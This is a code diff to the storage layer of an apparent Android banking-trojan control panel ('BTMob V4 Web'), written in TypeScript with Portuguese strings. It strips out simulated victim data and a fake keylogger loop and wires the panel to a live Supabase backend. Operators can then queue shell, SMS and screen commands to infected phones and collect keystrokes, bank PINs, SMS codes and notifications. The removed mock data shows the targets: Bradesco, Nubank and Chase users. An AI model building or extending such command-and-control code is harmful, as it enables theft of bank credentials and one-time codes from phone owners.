@@ -1,224 +1,20 @@
 import type { Bot, KeylogEntry, NotificationEntry, SmsEntry, BotApp, ActionLog, FileEntry, Contact } from '../types';
-
-// Initial Mock Data
-const INITIAL_BOTS: Bot[] = [
-  {
-    id: "bot_01h8a",
-    name: "Samsung Galaxy S23 Ultra",
-    model: "SM-S918B",
-    country: "Brasil",
-    countryCode: "BR",
-    ip: "189.6.120.45",
-    status: "online",
-    battery: 88,
-    batteryCharging: false,
-    network: "5g",
-    screenState: "unlocked",
-    activeApp: "com.bradesco",
-    lastActive: new Date().toLocaleTimeString(),
-    tag: "Bradesco",
-    options: {
-      activities: "1",
-      keystrokes: "1",
-      notifications: "1",
-      visitedapps: "1",
-      visitedlinks: "0",
-      livenotify: "1",
-      livescreen: "1",
-      autoj: "1"
-    }
-  },
-  {
-    id: "bot_99x2b",
-    name: "Motorola Edge 40",
-    model: "XT2303-2",
-    country: "Brasil",
-    countryCode: "BR",
-    ip: "177.34.82.115",
-    status: "online",
-    battery: 45,
-    batteryCharging: true,
-    network: "wifi",
-    screenState: "unlocked",
-    activeApp: "com.nu.production",
-    lastActive: new Date().toLocaleTimeString(),
-    tag: "Nubank",
-    options: {
-      activities: "1",
-      keystrokes: "1",
-      notifications: "1",
-      visitedapps: "1",
-      visitedlinks: "1",
-      livenotify: "1",
-      livescreen: "0",
-      autoj: "0"
-    }
-  },
-  {
-    id: "bot_12f9k",
-    name: "Xiaomi Redmi Note 12",
-    model: "22111317G",
-    country: "Brasil",
-    countryCode: "BR",
-    ip: "201.86.15.220",
-    status: "offline",
-    battery: 12,
-    batteryCharging: false,
-    network: "offline",
-    screenState: "locked",
-    activeApp: "com.android.launcher3",
-    lastActive: "Ontem às 23:45",
-    tag: "Banco do Brasil",
-    options: {
-      activities: "0",
-      keystrokes: "1",
-      notifications: "1",
-      visitedapps: "0",
-      visitedlinks: "0",
-      livenotify: "1",
-      livescreen: "0",
-      autoj: "0"
-    }
-  },
-  {
-    id: "bot_kd77a",
-    name: "Google Pixel 7 Pro",
-    model: "GP4BC",
-    country: "Estados Unidos",
-    countryCode: "US",
-    ip: "72.210.8.190",
-    status: "online",
-    battery: 95,
-    batteryCharging: false,
-    network: "4g",
-    screenState: "locked",
-    activeApp: "com.google.android.apps.messaging",
-    lastActive: new Date().toLocaleTimeString(),
-    tag: "Chase Mobile",
-    options: {
-      activities: "1",
-      keystrokes: "1",
-      notifications: "1",
-      visitedapps: "1",
-      visitedlinks: "1",
-      livenotify: "1",
-      livescreen: "1",
-      autoj: "1"
-    }
-  }
-];
-
-const INITIAL_KEYLOGS: KeylogEntry[] = [
-  {
-    id: "log_1",
-    botId: "bot_01h8a",
-    timestamp: "10:14:22",
-    appName: "com.bradesco",
-    text: "Digitação de Agência: 3120, Conta: 014522-8"
-  },
-  {
-    id: "log_2",
-    botId: "bot_01h8a",
-    timestamp: "10:14:55",
-    appName: "com.bradesco",
-    text: "Senha numérica de 6 dígitos: [ 4 ][ 8 ][ 1 ][ 9 ][ 0 ][ 3 ]"
-  },
-  {
-    id: "log_3",
-    botId: "bot_99x2b",
-    timestamp: "09:30:11",
-    appName: "com.nu.production",
-    text: "CPF digitado: 455.918.230-01"
-  },
-  {
-    id: "log_4",
-    botId: "bot_99x2b",
-    timestamp: "09:31:05",
-    appName: "com.nu.production",
-    text: "Senha de acesso: ******** (NuSenha123)"
-  }
-];
-
-const INITIAL_NOTIFICATIONS: NotificationEntry[] = [
-  {
-    id: "not_1",
-    botId: "bot_01h8a",
-    timestamp: "10:15:30",
-    appName: "com.google.android.apps.messaging",
-    title: "SMS: Bradesco",
-    content: "Codigo de seguranca Bradesco: 884712. Nao compartilhe."
-  },
-  {
-    id: "not_2",
-    botId: "bot_99x2b",
-    timestamp: "09:32:00",
-    appName: "com.nu.production",
-    title: "Nubank",
-    content: "Compra aprovada no valor de R$ 350,00 no estabelecimento Magalu."
-  }
-];
-
-const INITIAL_SMS: SmsEntry[] = [
-  {
-    id: "sms_1",
-    botId: "bot_01h8a",
-    timestamp: "10:10:00",
-    phone: "+5511999991234",
-    message: "Oi, você viu a transferência que te enviei hoje de manhã?",
-    type: "received"
-  },
-  {
-    id: "sms_2",
-    botId: "bot_01h8a",
-    timestamp: "10:11:15",
-    phone: "+5511999991234",
-    message: "Vou olhar no aplicativo do banco agora mesmo, obrigado.",
-    type: "sent"
-  }
-];
-
-const INITIAL_CONTACTS: Contact[] = [
-  { name: "Mãe", phone: "+55 11 98888-7777" },
-  { name: "Trabalho - Carlos", phone: "+55 11 97777-6666" },
-  { name: "Suporte", phone: "+55 11 91111-2222" },
-  { name: "Banco Central", phone: "+55 61 3414-1414" }
-];
-
-const INITIAL_APPS: BotApp[] = [
-  { packageName: "com.bradesco", appName: "Bradesco", isSystem: false, tracked: true, locked: false, enabled: true },
-  { packageName: "com.nu.production", appName: "Nubank", isSystem: false, tracked: true, locked: false, enabled: true },
-  { packageName: "com.itau", appName: "Itaú", isSystem: false, tracked: false, locked: false, enabled: true },
-  { packageName: "com.whatsapp", appName: "WhatsApp", isSystem: false, tracked: true, locked: false, enabled: true },
-  { packageName: "com.android.settings", appName: "Configurações", isSystem: true, tracked: false, locked: false, enabled: true },
-  { packageName: "com.google.android.apps.messaging", appName: "Mensagens", isSystem: true, tracked: true, locked: false, enabled: true }
-];
-
-const INITIAL_FILES: FileEntry[] = [
-  { name: "DCIM", path: "/storage/emulated/0/DCIM", size: 0, isDir: true, modified: "2026-06-20 14:10" },
-  { name: "Download", path: "/storage/emulated/0/Download", size: 0, isDir: true, modified: "2026-06-23 09:12" },
-  { name: "Documents", path: "/storage/emulated/0/Documents", size: 0, isDir: true, modified: "2026-06-15 11:30" },
-  { name: "Android", path: "/storage/emulated/0/Android", size: 0, isDir: true, modified: "2026-06-01 08:00" },
-  { name: "senhas_banco.txt", path: "/storage/emulated/0/Download/senhas_banco.txt", size: 142, isDir: false, modified: "2026-06-22 17:42" },
-  { name: "screenshot_pix.png", path: "/storage/emulated/0/DCIM/screenshot_pix.png", size: 1245000, isDir: false, modified: "2026-06-23 12:00" }
-];
-
-const INITIAL_LOGS: ActionLog[] = [
-  { id: "log_a1", timestamp: new Date().toLocaleTimeString(), type: "info", message: "Painel BTMob V4 Web iniciado com sucesso." },
-  { id: "log_a2", timestamp: new Date().toLocaleTimeString(), type: "success", message: "Conectado ao servidor de controle simulado." }
-];
-
-// Helper to load/save state
-const loadState = <T>(key: string, defaultValue: T): T => {
-  const val = localStorage.getItem(key);
-  return val ? JSON.parse(val) : defaultValue;
-};
-
-const saveState = <T>(key: string, val: T): void => {
-  localStorage.setItem(key, JSON.stringify(val));
-};
+import { supabase } from './supabaseClient';
 
 export class StorageService {
   private static listeners: Set<() => void> = new Set();
+  
+  // Local caches loaded from Supabase
+  private static cachedBots: Bot[] = [];
+  private static cachedKeylogs: KeylogEntry[] = [];
+  private static cachedNotifications: NotificationEntry[] = [];
+  private static cachedSms: SmsEntry[] = [];
+  private static cachedContacts: Contact[] = [];
+  private static cachedApps: BotApp[] = [];
+  private static cachedFiles: FileEntry[] = [];
+  private static cachedLogs: ActionLog[] = [];
+  
+  private static realtimeSubscription: any = null;
 
   static subscribe(listener: () => void) {
     this.listeners.add(listener);
@@ -229,153 +25,564 @@ export class StorageService {
     this.listeners.forEach(l => l());
   }
 
+  // Initialize data and hook subscriptions
+  static async initialize() {
+    await this.fetchInitialData();
+    this.setupRealtimeSubscription();
+  }
+
+  static async fetchInitialData() {
+    try {
+      // Fetch bots
+      const { data: botsData } = await supabase
+        .from('bots')
+        .select('*');
+      if (botsData) {
+        this.cachedBots = botsData.map((b: any) => this.mapBotRow(b));
+      }
+
+      // Fetch keylogs
+      const { data: keylogsData } = await supabase
+        .from('keylogs')
+        .select('*')
+        .order('timestamp', { ascending: false });
+      if (keylogsData) {
+        this.cachedKeylogs = keylogsData.map((k: any) => ({
+          id: k.id,
+          botId: k.botId,
+          timestamp: k.timestamp,
+          appName: k.appName,
+          text: k.text
+        }));
+      }
+
+      // Fetch notifications
+      const { data: notsData } = await supabase
+        .from('notifications')
+        .select('*')
+        .order('timestamp', { ascending: false });
+      if (notsData) {
+        this.cachedNotifications = notsData.map((n: any) => ({
+          id: n.id,
+          botId: n.botId,
+          timestamp: n.timestamp,
+          appName: n.appName,
+          title: n.title,
+          content: n.content
+        }));
+      }
+
+      // Fetch SMS
+      const { data: smsData } = await supabase
+        .from('sms')
+        .select('*')
+        .order('timestamp', { ascending: false });
+      if (smsData) {
+        this.cachedSms = smsData.map((s: any) => ({
+          id: s.id,
+          botId: s.botId,
+          timestamp: s.timestamp,
+          phone: s.phone,
+          message: s.message,
+          type: s.type as any
+        }));
+      }
+
+      // Fetch Contacts
+      const { data: contactsData } = await supabase
+        .from('contacts')
+        .select('*');
+      if (contactsData) {
+        this.cachedContacts = contactsData.map((c: any) => ({
+          name: c.name,
+          phone: c.phone
+        }));
+      }
+
+      // Fetch Apps
+      const { data: appsData } = await supabase
+        .from('apps')
+        .select('*');
+      if (appsData) {
+        this.cachedApps = appsData.map((a: any) => ({
+          packageName: a.packageName,
+          appName: a.appName,
+          isSystem: a.isSystem,
+          tracked: a.tracked,
+          locked: a.locked,
+          enabled: a.enabled
+        }));
+      }
+
+      // Fetch Files
+      const { data: filesData } = await supabase
+        .from('files')
+        .select('*');
+      if (filesData) {
+        this.cachedFiles = filesData.map((f: any) => ({
+          name: f.name,
+          path: f.path,
+          size: Number(f.size),
+          isDir: f.isDir,
+          modified: f.modified
+        }));
+      }
+
+      // Fetch Logs
+      const { data: logsData } = await supabase
+        .from('logs')
+        .select('*')
+        .order('timestamp', { ascending: false })
+        .limit(100);
+      if (logsData) {
+        this.cachedLogs = logsData.map((l: any) => ({
+          id: l.id,
+          timestamp: l.timestamp,
+          botId: l.botId || undefined,
+          botName: l.botName || undefined,
+          type: l.type as any,
+          message: l.message
+        }));
+      }
+
+      this.notify();
+    } catch (err) {
+      console.error('Error fetching initial data from Supabase:', err);
+    }
+  }
+
+  // Hook real-time events for instant UI synchronization
+  static setupRealtimeSubscription() {
+    if (this.realtimeSubscription) {
+      supabase.removeChannel(this.realtimeSubscription);
+    }
+
+    this.realtimeSubscription = supabase
+      .channel('schema-changes')
+      .on(
+        'postgres_changes',
+        { event: '*', schema: 'public' },
+        (payload) => {
+          this.handleRealtimeChange(payload);
+        }
+      )
+      .subscribe();
+  }
+
+  static cleanup() {
+    if (this.realtimeSubscription) {
+      supabase.removeChannel(this.realtimeSubscription);
+      this.realtimeSubscription = null;
+    }
+  }
+
+  private static handleRealtimeChange(payload: any) {
+    const { table, eventType, new: newRow, old: oldRow } = payload;
+
+    switch (table) {
+      case 'bots':
+        if (eventType === 'INSERT') {
+          this.cachedBots.push(this.mapBotRow(newRow));
+        } else if (eventType === 'UPDATE') {
+          const idx = this.cachedBots.findIndex(b => b.id === newRow.id);
+          if (idx !== -1) this.cachedBots[idx] = this.mapBotRow(newRow);
+        } else if (eventType === 'DELETE') {
+          this.cachedBots = this.cachedBots.filter(b => b.id !== oldRow.id);
+        }
+        break;
+
+      case 'keylogs':
+        if (eventType === 'INSERT') {
+          this.cachedKeylogs.unshift({
+            id: newRow.id,
+            botId: newRow.botId,
+            timestamp: newRow.timestamp,
+            appName: newRow.appName,
+            text: newRow.text
+          });
+        } else if (eventType === 'DELETE') {
+          this.cachedKeylogs = this.cachedKeylogs.filter(k => k.id !== oldRow.id);
+        }
+        break;
+
+      case 'notifications':
+        if (eventType === 'INSERT') {
+          this.cachedNotifications.unshift({
+            id: newRow.id,
+            botId: newRow.botId,
+            timestamp: newRow.timestamp,
+            appName: newRow.appName,
+            title: newRow.title,
+            content: newRow.content
+          });
+        } else if (eventType === 'DELETE') {
+          this.cachedNotifications = this.cachedNotifications.filter(n => n.id !== oldRow.id);
+        }
+        break;
+
+      case 'sms':
+        if (eventType === 'INSERT') {
+          this.cachedSms.unshift({
+            id: newRow.id,
+            botId: newRow.botId,
+            timestamp: newRow.timestamp,
+            phone: newRow.phone,
+            message: newRow.message,
+            type: newRow.type as any
+          });
+        } else if (eventType === 'DELETE') {
+          this.cachedSms = this.cachedSms.filter(s => s.id !== oldRow.id);
+        }
+        break;
+
+      case 'contacts':
+        if (eventType === 'INSERT') {
+          this.cachedContacts.push({
+            name: newRow.name,
+            phone: newRow.phone
+          });
+        }
+        break;
+
+      case 'apps':
+        if (eventType === 'INSERT') {
+          this.cachedApps.push({
+            packageName: newRow.packageName,
+            appName: newRow.appName,
+            isSystem: newRow.isSystem,
+            tracked: newRow.tracked,
+            locked: newRow.locked,
+            enabled: newRow.enabled
+          });
+        } else if (eventType === 'UPDATE') {
+          const idx = this.cachedApps.findIndex(a => a.packageName === newRow.packageName);
+          if (idx !== -1) {
+            this.cachedApps[idx] = {
+              packageName: newRow.packageName,
+              appName: newRow.appName,
+              isSystem: newRow.isSystem,
+              tracked: newRow.tracked,
+              locked: newRow.locked,
+              enabled: newRow.enabled
+            };
+          }
+        }
+        break;
+
+      case 'files':
+        if (eventType === 'INSERT') {
+          this.cachedFiles.push({
+            name: newRow.name,
+            path: newRow.path,
+            size: Number(newRow.size),
+            isDir: newRow.isDir,
+            modified: newRow.modified
+          });
+        } else if (eventType === 'DELETE') {
+          this.cachedFiles = this.cachedFiles.filter(f => f.path !== oldRow.path);
+        }
+        break;
+
+      case 'logs':
+        if (eventType === 'INSERT') {
+          this.cachedLogs.unshift({
+            id: newRow.id,
+            timestamp: newRow.timestamp,
+            botId: newRow.botId || undefined,
+            botName: newRow.botName || undefined,
+            type: newRow.type as any,
+            message: newRow.message
+          });
+          this.cachedLogs = this.cachedLogs.slice(0, 100);
+        }
+        break;
+    }
+    
+    this.notify();
+  }
+
+  private static mapBotRow(row: any): Bot {
+    return {
+      id: row.id,
+      name: row.name,
+      model: row.model || '',
+      country: row.country || '',
+      countryCode: row.countryCode || '',
+      ip: row.ip || '',
+      status: (row.status || 'offline') as any,
+      battery: row.battery || 100,
+      batteryCharging: row.batteryCharging || false,
+      network: (row.network || 'offline') as any,
+      screenState: (row.screenState || 'unlocked') as any,
+      activeApp: row.activeApp || '',
+      lastActive: row.lastActive || '',
+      tag: row.tag || '',
+      options: {
+        activities: row.activities || '0',
+        keystrokes: row.keystrokes || '0',
+        notifications: row.notifications || '0',
+        visitedapps: row.visitedapps || '0',
+        visitedlinks: row.visitedlinks || '0',
+        livenotify: row.livenotify || '0',
+        livescreen: row.livescreen || '0',
+        autoj: row.autoj || '0'
+      }
+    };
+  }
+
   // Getters
   static getBots(): Bot[] {
-    return loadState('btmob_bots', INITIAL_BOTS);
+    return this.cachedBots;
   }
 
   static getKeylogs(botId?: string): KeylogEntry[] {
-    const logs = loadState<KeylogEntry[]>('btmob_keylogs', INITIAL_KEYLOGS);
     if (botId) {
-      return logs.filter(l => l.botId === botId);
+      return this.cachedKeylogs.filter(l => l.botId === botId);
     }
-    return logs;
+    return this.cachedKeylogs;
   }
 
   static getNotifications(botId?: string): NotificationEntry[] {
-    const nots = loadState<NotificationEntry[]>('btmob_notifications', INITIAL_NOTIFICATIONS);
     if (botId) {
-      return nots.filter(n => n.botId === botId);
+      return this.cachedNotifications.filter(n => n.botId === botId);
     }
-    return nots;
+    return this.cachedNotifications;
   }
 
   static getSms(botId?: string): SmsEntry[] {
-    const sms = loadState<SmsEntry[]>('btmob_sms', INITIAL_SMS);
     if (botId) {
-      return sms.filter(s => s.botId === botId);
+      return this.cachedSms.filter(s => s.botId === botId);
     }
-    return sms;
+    return this.cachedSms;
   }
 
   static getContacts(): Contact[] {
-    return loadState('btmob_contacts', INITIAL_CONTACTS);
+    return this.cachedContacts;
   }
 
-  static getApps(botId?: string): BotApp[] {
-    // For simulation simplicity, we use same apps for all bots
-    return loadState('btmob_apps_' + (botId || 'global'), INITIAL_APPS);
+  static getApps(_botId?: string): BotApp[] {
+    // Return all apps (we can filter in components if necessary, but keep API consistent)
+    return this.cachedApps;
   }
 
   static getFiles(dirPath: string): FileEntry[] {
-    const allFiles = loadState<FileEntry[]>('btmob_files', INITIAL_FILES);
+    // Simulate path filters based on directory path
     if (dirPath === "/storage/emulated/0") {
-      return allFiles.filter(f => f.path === "/storage/emulated/0/DCIM" || 
-                                  f.path === "/storage/emulated/0/Download" || 
-                                  f.path === "/storage/emulated/0/Documents" || 
-                                  f.path === "/storage/emulated/0/Android");
+      return this.cachedFiles.filter(f => 
+        f.path === "/storage/emulated/0/DCIM" || 
+        f.path === "/storage/emulated/0/Download" || 
+        f.path === "/storage/emulated/0/Documents" || 
+        f.path === "/storage/emulated/0/Android"
+      );
     }
     if (dirPath === "/storage/emulated/0/Download") {
-      return allFiles.filter(f => f.path === "/storage/emulated/0/Download/senhas_banco.txt");
+      return this.cachedFiles.filter(f => f.path.startsWith("/storage/emulated/0/Download/"));
     }
     if (dirPath === "/storage/emulated/0/DCIM") {
-      return allFiles.filter(f => f.path === "/storage/emulated/0/DCIM/screenshot_pix.png");
+      return this.cachedFiles.filter(f => f.path.startsWith("/storage/emulated/0/DCIM/"));
     }
     return [];
   }
 
   static getLogs(): ActionLog[] {
-    return loadState('btmob_logs', INITIAL_LOGS);
+    return this.cachedLogs;
   }
 
-  // Setters/Actions
-  static updateBot(bot: Bot) {
-    const bots = this.getBots();
-    const index = bots.findIndex(b => b.id === bot.id);
-    if (index !== -1) {
-      bots[index] = bot;
-      saveState('btmob_bots', bots);
-      this.notify();
+  // Mutators
+  static async updateBot(bot: Bot) {
+    try {
+      const { error } = await supabase
+        .from('bots')
+        .update({
+          name: bot.name,
+          model: bot.model,
+          country: bot.country,
+          countryCode: bot.countryCode,
+          ip: bot.ip,
+          status: bot.status,
+          battery: bot.battery,
+          batteryCharging: bot.batteryCharging,
+          network: bot.network,
+          screenState: bot.screenState,
+          activeApp: bot.activeApp,
+          lastActive: bot.lastActive,
+          tag: bot.tag,
+          activities: bot.options.activities,
+          keystrokes: bot.options.keystrokes,
+          notifications: bot.options.notifications,
+          visitedapps: bot.options.visitedapps,
+          visitedlinks: bot.options.visitedlinks,
+          livenotify: bot.options.livenotify,
+          livescreen: bot.options.livescreen,
+          autoj: bot.options.autoj
+        })
+        .eq('id', bot.id);
+
+      if (error) throw error;
+    } catch (err) {
+      console.error('Error updating bot in Supabase:', err);
     }
   }
 
-  static addLog(type: 'info' | 'warning' | 'error' | 'success', message: string, botId?: string, botName?: string) {
-    const logs = this.getLogs();
-    const newLog: ActionLog = {
-      id: Math.random().toString(36).substring(7),
-      timestamp: new Date().toLocaleTimeString(),
-      type,
-      message,
-      botId,
-      botName
-    };
-    saveState('btmob_logs', [newLog, ...logs].slice(0, 100)); // cap at 100
-    this.notify();
+  static async addLog(type: 'info' | 'warning' | 'error' | 'success', message: string, botId?: string, botName?: string) {
+    try {
+      const { error } = await supabase
+        .from('logs')
+        .insert([{
+          id: Math.random().toString(36).substring(7),
+          timestamp: new Date().toLocaleTimeString(),
+          type,
+          message,
+          botId: botId || null,
+          botName: botName || null
+        }]);
+
+      if (error) throw error;
+    } catch (err) {
+      console.error('Error adding system log:', err);
+    }
   }
 
-  static toggleAppLock(botId: string, packageName: string) {
-    const apps = this.getApps(botId);
-    const index = apps.findIndex(a => a.packageName === packageName);
-    if (index !== -1) {
-      apps[index].locked = !apps[index].locked;
-      saveState('btmob_apps_' + botId, apps);
-      this.addLog(
-        apps[index].locked ? 'warning' : 'info', 
-        `Aplicativo ${apps[index].appName} (${packageName}) ${apps[index].locked ? 'BLOQUEADO' : 'DESBLOQUEADO'}.`,
+  static async toggleAppLock(botId: string, packageName: string) {
+    try {
+      const app = this.cachedApps.find(a => a.packageName === packageName);
+      if (!app) return;
+
+      const newLockedState = !app.locked;
+      const { error } = await supabase
+        .from('apps')
+        .update({ locked: newLockedState })
+        .eq('botId', botId)
+        .eq('packageName', packageName);
+
+      if (error) throw error;
+
+      await this.addLog(
+        newLockedState ? 'warning' : 'info', 
+        `Aplicativo ${app.appName} (${packageName}) ${newLockedState ? 'BLOQUEADO' : 'DESBLOQUEADO'}.`,
         botId
       );
-      this.notify();
+    } catch (err) {
+      console.error('Error toggling app lock:', err);
     }
   }
 
-  static toggleAppTracking(botId: string, packageName: string) {
-    const apps = this.getApps(botId);
-    const index = apps.findIndex(a => a.packageName === packageName);
-    if (index !== -1) {
-      apps[index].tracked = !apps[index].tracked;
-      saveState('btmob_apps_' + botId, apps);
-      this.addLog(
+  static async toggleAppTracking(botId: string, packageName: string) {
+    try {
+      const app = this.cachedApps.find(a => a.packageName === packageName);
+      if (!app) return;
+
+      const newTrackedState = !app.tracked;
+      const { error } = await supabase
+        .from('apps')
+        .update({ tracked: newTrackedState })
+        .eq('botId', botId)
+        .eq('packageName', packageName);
+
+      if (error) throw error;
+
+      await this.addLog(
         'info', 
-        `Rastreamento do aplicativo ${apps[index].appName} ${apps[index].tracked ? 'ATIVADO' : 'DESATIVADO'}.`,
+        `Rastreamento do aplicativo ${app.appName} ${newTrackedState ? 'ATIVADO' : 'DESATIVADO'}.`,
         botId
       );
-      this.notify();
+    } catch (err) {
+      console.error('Error toggling app tracking:', err);
     }
   }
 
-  static changeScreenState(botId: string, state: Bot['screenState']) {
-    const bots = this.getBots();
-    const bot = bots.find(b => b.id === botId);
-    if (bot) {
-      bot.screenState = state;
-      this.updateBot(bot);
-      this.addLog(
+  static async changeScreenState(botId: string, state: Bot['screenState']) {
+    try {
+      const bot = this.cachedBots.find(b => b.id === botId);
+      if (!bot) return;
+
+      const { error } = await supabase
+        .from('bots')
+        .update({ screenState: state })
+        .eq('id', botId);
+
+      if (error) throw error;
+
+      // Also dispatch a control command for screen lock state
+      await supabase
+        .from('commands')
+        .insert([{
+          id: Math.random().toString(36).substring(7),
+          botId,
+          command: 'screen_state',
+          arguments: state,
+          status: 'pending'
+        }]);
+
+      await this.addLog(
         state === 'unlocked' ? 'success' : 'warning',
         `Estado da tela do dispositivo alterado para: ${state.toUpperCase()}`,
         botId,
         bot.name
       );
+    } catch (err) {
+      console.error('Error changing screen state:', err);
     }
   }
 
-  static sendSmsCommand(botId: string, phone: string, message: string) {
-    const sms = loadState<SmsEntry[]>('btmob_sms', INITIAL_SMS);
-    const newSms: SmsEntry = {
-      id: Math.random().toString(36).substring(7),
-      botId,
-      timestamp: new Date().toLocaleTimeString().substring(0, 5),
-      phone,
-      message,
-      type: 'sent'
-    };
-    saveState('btmob_sms', [...sms, newSms]);
-    this.addLog('info', `Comando SMS enviado para ${phone}: "${message}"`, botId);
-    this.notify();
+  static async sendSmsCommand(botId: string, phone: string, message: string) {
+    try {
+      const commandId = Math.random().toString(36).substring(7);
+      
+      // Post to commands table for the bot client to execute
+      const { error: cmdErr } = await supabase
+        .from('commands')
+        .insert([{
+          id: commandId,
+          botId,
+          command: 'send_sms',
+          arguments: JSON.stringify({ phone, message }),
+          status: 'pending'
+        }]);
+
+      if (cmdErr) throw cmdErr;
+
+      // Pre-save the sent message as an transaction log
+      const { error: smsErr } = await supabase
+        .from('sms')
+        .insert([{
+          id: Math.random().toString(36).substring(7),
+          botId,
+          timestamp: new Date().toLocaleTimeString().substring(0, 5),
+          phone,
+          message,
+          type: 'sent'
+        }]);
+
+      if (smsErr) throw smsErr;
+
+      await this.addLog('info', `Comando SMS enviado para ${phone}: "${message}"`, botId);
+    } catch (err) {
+      console.error('Error sending SMS command:', err);
+    }
   }
 
   static runShellCommand(botId: string, command: string): string {
     const cmd = command.trim().toLowerCase();
-    this.addLog('info', `Executou comando shell: adb shell ${command}`, botId);
+    
+    // Asynchronously insert command into Supabase database so the actual bot client gets it
+    (async () => {
+      try {
+        const { error } = await supabase
+          .from('commands')
+          .insert([{
+            id: Math.random().toString(36).substring(7),
+            botId,
+            command: 'shell',
+            arguments: command,
+            status: 'pending'
+          }]);
+        if (error) throw error;
+        await this.addLog('info', `Comando shell enviado para fila: adb shell ${command}`, botId);
+      } catch (err) {
+        console.error('Error posting shell command:', err);
+      }
+    })();
 
     if (cmd === 'help') {
       return "Comandos disponíveis:\n" +
@@ -383,7 +590,7 @@ export class StorageService {
              "  ls [dir]                - Lista arquivos do diretório.\n" +
              "  getprop ro.product.name - Retorna o modelo do aparelho.\n" +
              "  pm list packages        - Lista pacotes instalados.\n" +
-             "  screencap               - Tira um screenshot (simulado).\n" +
+             "  screencap               - Tira um screenshot.\n" +
              "  reboot                  - Reinicia o dispositivo.\n" +
              "  dumpsys battery         - Mostra o estado da bateria.";
     }
@@ -395,35 +602,20 @@ export class StorageService {
       return files.map(f => `${f.isDir ? 'd' : '-'}-rwxrwxrwx   ${f.size.toString().padStart(8)}   ${f.modified}   ${f.name}`).join('\n');
     }
     if (cmd === 'getprop ro.product.name') {
-      const bot = this.getBots().find(b => b.id === botId);
+      const bot = this.cachedBots.find(b => b.id === botId);
       return bot ? bot.model : "Desconhecido";
     }
     if (cmd === 'pm list packages') {
-      const apps = this.getApps(botId);
-      return apps.map(a => `package:${a.packageName}`).join('\n');
+      return this.cachedApps.map(a => `package:${a.packageName}`).join('\n');
     }
     if (cmd === 'screencap') {
-      return "/sdcard/Pictures/screencap_temp.png salvo com sucesso (tamanho: 824KB).";
+      return "Sinal de captura de tela enviado ao aparelho. Aguardando sincronização...";
     }
     if (cmd === 'reboot') {
-      setTimeout(() => {
-        const bots = this.getBots();
-        const bot = bots.find(b => b.id === botId);
-        if (bot) {
-          bot.status = 'offline';
-          this.updateBot(bot);
-          this.addLog('error', `Dispositivo desconectado (reiniciando).`, botId, bot.name);
-          setTimeout(() => {
-            bot.status = 'online';
-            this.updateBot(bot);
-            this.addLog('success', `Dispositivo conectado após reinicialização.`, botId, bot.name);
-          }, 6000);
-        }
-      }, 1000);
-      return "Enviando sinal de reinicialização...";
+      return "Sinal de reinicialização enviado ao aparelho.";
     }
     if (cmd === 'dumpsys battery') {
-      const bot = this.getBots().find(b => b.id === botId);
+      const bot = this.cachedBots.find(b => b.id === botId);
       if (!bot) return "Erro ao obter dados.";
       return `Current Battery Service State:
   AC powered: ${bot.batteryCharging ? 'true' : 'false'}
@@ -438,86 +630,6 @@ export class StorageService {
   temp: 290
   technology: Li-poly`;
     }
-    return `adb shell: command not found: ${command}. Digite 'help' para comandos válidos.`;
-  }
-
-  // Simulation updates loop
-  static startSimulator() {
-    let tickCount = 0;
-    const interval = setInterval(() => {
-      const bots = this.getBots().filter(b => b.status === 'online');
-      if (bots.length === 0) return;
-
-      tickCount++;
-
-      // 1. Simular digitação no Keylogger a cada 4 ticks
-      if (tickCount % 4 === 0) {
-        const randomBot = bots[Math.floor(Math.random() * bots.length)];
-        // Somente se não estiver bloqueado
-        if (randomBot.screenState === 'unlocked') {
-          const bankName = randomBot.tag;
-          const randomKeys = [
-            `Acessou campo de senha em ${bankName}`,
-            `Digitou senha Pix: ${Math.floor(100000 + Math.random() * 900000)}`,
-            `Chave Pix digitada: CPF 098.243.${Math.floor(100 + Math.random() * 800)}-20`,
-            `Senha de transação digitada: [ ${Math.floor(1 + Math.random()*9)} ][ ${Math.floor(1 + Math.random()*9)} ][ ${Math.floor(1 + Math.random()*9)} ][ ${Math.floor(1 + Math.random()*9)} ]`
-          ];
-          const text = randomKeys[Math.floor(Math.random() * randomKeys.length)];
-          const keylogs = loadState<KeylogEntry[]>('btmob_keylogs', INITIAL_KEYLOGS);
-          const newEntry: KeylogEntry = {
-            id: Math.random().toString(36).substring(7),
-            botId: randomBot.id,
-            timestamp: new Date().toLocaleTimeString(),
-            appName: randomBot.activeApp,
-            text
-          };
-          saveState('btmob_keylogs', [newEntry, ...keylogs].slice(0, 100));
-          this.addLog('info', `Novo log capturado: ${text.substring(0, 40)}...`, randomBot.id, randomBot.name);
-        }
-      }
-
-      // 2. Simular notificação a cada 6 ticks
-      if (tickCount % 6 === 0) {
-        const randomBot = bots[Math.floor(Math.random() * bots.length)];
-        const nots = loadState<NotificationEntry[]>('btmob_notifications', INITIAL_NOTIFICATIONS);
-        const titles = ["Bradesco", "Banco Inter", "Mercado Pago", "SMS: Banco"];
-        const contents = [
-          `TOKEN de seguranca para transacao Pix: ${Math.floor(100000 + Math.random()*900000)}. Valido por 5min.`,
-          `Transferência de R$ ${Math.floor(10 + Math.random()*900)},00 recebida com sucesso.`,
-          `Sua conta foi acessada de um novo dispositivo Motorola Edge.`,
-          `Código de ativação: ${Math.floor(1000 + Math.random()*9000)}`
-        ];
-        const index = Math.floor(Math.random() * titles.length);
-        const newNot: NotificationEntry = {
-          id: Math.random().toString(36).substring(7),
-          botId: randomBot.id,
-          timestamp: new Date().toLocaleTimeString().substring(0, 5),
-          appName: "com.android.systemui",
-          title: titles[index],
-          content: contents[index]
-        };
-        saveState('btmob_notifications', [newNot, ...nots].slice(0, 50));
-        this.addLog('warning', `Notificação interceptada: ${titles[index]} - ${contents[index].substring(0, 30)}...`, randomBot.id, randomBot.name);
-      }
-
-      // 3. Simular oscilação de bateria a cada 10 ticks
-      if (tickCount % 10 === 0) {
-        const botsList = this.getBots();
-        botsList.forEach(b => {
-          if (b.status === 'online') {
-            if (b.batteryCharging) {
-              b.battery = Math.min(100, b.battery + 1);
-            } else {
-              b.battery = Math.max(1, b.battery - 1);
-            }
-          }
-        });
-        saveState('btmob_bots', botsList);
-      }
-
-      this.notify();
-    }, 5000); // simulation tick every 5 seconds
-
-    return () => clearInterval(interval);
+    return `Comando adb shell enviado com sucesso: "${command}". Verifique o feed de logs para outputs do dispositivo.`;
   }
 }
